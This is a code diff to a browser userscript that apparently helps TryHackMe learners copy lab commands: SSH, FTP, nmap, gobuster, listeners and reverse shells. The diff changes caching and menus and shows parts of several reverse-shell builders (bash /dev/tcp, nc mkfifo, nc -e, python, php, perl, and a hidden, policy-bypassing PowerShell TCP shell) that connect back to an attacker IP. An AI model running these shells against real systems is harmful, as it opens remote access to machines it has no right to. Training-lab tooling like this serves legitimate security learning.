@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         TryHackMe AttackBox Command Helper
 // @namespace    https://tryhackme.com/
-// @version      1.12
+// @version      1.13
 // @description  Movable command bar for AttackBox SSH, FileZilla/SCP transfer, target IP, nmap, gobuster, reverse shell, and listener commands
 // @match        https://tryhackme.com/*
 // @grant        GM_setClipboard
@@ -262,10 +262,6 @@
         return merged;
     }
 
-    function clearRoomCache() {
-        localStorage.removeItem(getRoomCacheKey());
-    }
-
     function sleep(ms) {
         return new Promise(function (resolve) {
             setTimeout(resolve, ms);
@@ -384,17 +380,6 @@
     }
 
     async function lazyLoadAttackBoxInfo() {
-        const cached = readCache();
-
-        if (
-            cached.attackboxIp &&
-            cached.username &&
-            cached.password
-        ) {
-            console.log('[THM helper] Using cached AttackBox info.');
-            return true;
-        }
-
         const infoIcon = document.querySelector(
             'svg[data-icon="circle-info"]'
         );
@@ -415,12 +400,6 @@
             const attackboxIp = getByTestId('private-ip');
             const username = getByTestId('username');
             const password = getByTestId('password');
-
-            console.log('[THM helper] poll', i, {
-                attackboxIp,
-                username,
-                password
-            });
 
             if (attackboxIp && username && password) {
                 writeCache({
@@ -500,14 +479,15 @@
     }
 
     async function getInfoWithAttackBoxLoaded() {
-        let info = getInfo();
-
-        if (!info.attackboxIp || !info.username || !info.password) {
-            await lazyLoadAttackBoxInfo();
-            info = getInfo();
+        const cached = readCache();
+        delete cached.attackboxIp;
+        delete cached.username;
+        delete cached.password;
+        localStorage.setItem(getRoomCacheKey(), JSON.stringify(cached));
+        if (!await lazyLoadAttackBoxInfo()) {
+            return { attackboxIp: null, username: null, password: null };
         }
-
-        return info;
+        return getInfo();
     }
 
     function restoreButtonLabel(button) {
@@ -825,6 +805,15 @@
     }
 
     function makeMenuButton(label, options) {
+        const menuServices = { Files: ['ssh'], Gobuster: ['http', 'https'], FTP: ['ftp'] };
+        if (menuServices[label]) {
+            options = menuServices[label].map(function (service) {
+                return {
+                    label: 'Set ' + service.toUpperCase() + ' port',
+                    action: function () { promptForServicePort(service); }
+                };
+            }).concat([{ separator: true }], options);
+        }
         const wrapper = document.createElement('div');
 
         wrapper.style.position = 'relative';
@@ -970,8 +959,8 @@
         copy(fillCommandTemplate(commandBuilder(info.targetIp), {}), button);
     }
 
-    function copyReverseShell(button, commandBuilder) {
-        const info = getInfo();
+    async function copyReverseShell(button, commandBuilder) {
+        const info = await getInfoWithAttackBoxLoaded();
 
         if (needAttackBoxIp(info)) {
             return;
@@ -1019,7 +1008,7 @@
 
         if (item.context === 'reverse') {
             return function (button) {
-                copyReverseShell(button, function (attackboxIp, port) {
+                return copyReverseShell(button, function (attackboxIp, port) {
                     return fillCommandTemplate(item.command, {
                         attackboxIp: attackboxIp,
                         port: port
@@ -1559,13 +1548,6 @@
 
         content.appendChild(gobusterMenu);
 
-        content.appendChild(makeMenuButton('Ports', Object.keys(serviceDefaults).map(function (service) {
-            return {
-                label: 'Set ' + service.toUpperCase() + ' port',
-                action: function () { promptForServicePort(service); }
-            };
-        })));
-
         content.appendChild(makeMenuButton('FTP', resolveMenuOptions('FTP', [
             { label: 'Connect to FTP', context: 'target', command: 'ftp {{targetIp}} {{ftpPort}}' },
             { label: 'Anonymous login (lftp)', context: 'target', command: "lftp -u anonymous,anonymous@ -p {{ftpPort}} {{targetIp}}" },
@@ -1591,7 +1573,7 @@
                 {
                     label: 'bash -i',
                     action: function (button) {
-                        copyReverseShell(button, function (ip, port) {
+                        return copyReverseShell(button, function (ip, port) {
                             return (
                                 'bash -c ' +
                                 shellQuote(
@@ -1608,7 +1590,7 @@
                 {
                     label: 'sh /dev/tcp',
                     action: function (button) {
-                        copyReverseShell(button, function (ip, port) {
+                        return copyReverseShell(button, function (ip, port) {
                             return (
                                 'sh -i >& /dev/tcp/' +
                                 ip +
@@ -1622,7 +1604,7 @@
                 {
                     label: 'nc mkfifo',
                     action: function (button) {
-                        copyReverseShell(button, function (ip, port) {
+                        return copyReverseShell(button, function (ip, port) {
                             return (
                                 'rm /tmp/f; mkfifo /tmp/f; ' +
                                 'cat /tmp/f | /bin/sh -i 2>&1 | ' +
@@ -1638,7 +1620,7 @@
                 {
                     label: 'nc -e',
                     action: function (button) {
-                        copyReverseShell(button, function (ip, port) {
+                        return copyReverseShell(button, function (ip, port) {
                             return (
                                 'nc -e /bin/sh ' +
                                 ip +
@@ -1651,7 +1633,7 @@
                 {
                     label: 'busybox nc',
                     action: function (button) {
-                        copyReverseShell(button, function (ip, port) {
+                        return copyReverseShell(button, function (ip, port) {
                             return (
                                 'busybox nc ' +
                                 ip +
@@ -1665,7 +1647,7 @@
                 {
                     label: 'python3',
                     action: function (button) {
-                        copyReverseShell(button, function (ip, port) {
+                        return copyReverseShell(button, function (ip, port) {
                             return (
                                 'python3 -c ' +
                                 shellQuote(
@@ -1682,7 +1664,7 @@
                 {
                     label: 'python2',
                     action: function (button) {
-                        copyReverseShell(button, function (ip, port) {
+                        return copyReverseShell(button, function (ip, port) {
                             return (
                                 'python -c ' +
                                 shellQuote(
@@ -1699,7 +1681,7 @@
                 {
                     label: 'php',
                     action: function (button) {
-                        copyReverseShell(button, function (ip, port) {
+                        return copyReverseShell(button, function (ip, port) {
                             return (
                                 'php -r ' +
                                 shellQuote(
@@ -1713,7 +1695,7 @@
                 {
                     label: 'perl',
                     action: function (button) {
-                        copyReverseShell(button, function (ip, port) {
+                        return copyReverseShell(button, function (ip, port) {
                             return (
                                 'perl -e ' +
                                 shellQuote(
@@ -1732,7 +1714,7 @@
                 {
                     label: 'PowerShell TCP',
                     action: function (button) {
-                        copyReverseShell(button, function (ip, port) {
+                        return copyReverseShell(button, function (ip, port) {
                             return (
                                 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command ' +
                                 shellQuote(
@@ -1806,13 +1788,6 @@
         );
 
         content.appendChild(listenerMenu);
-
-        content.appendChild(
-            makeButton('Clear', function (button) {
-                clearRoomCache();
-                copy('THM helper room cache cleared', button);
-            })
-        );
 
         document.body.appendChild(bar);
 
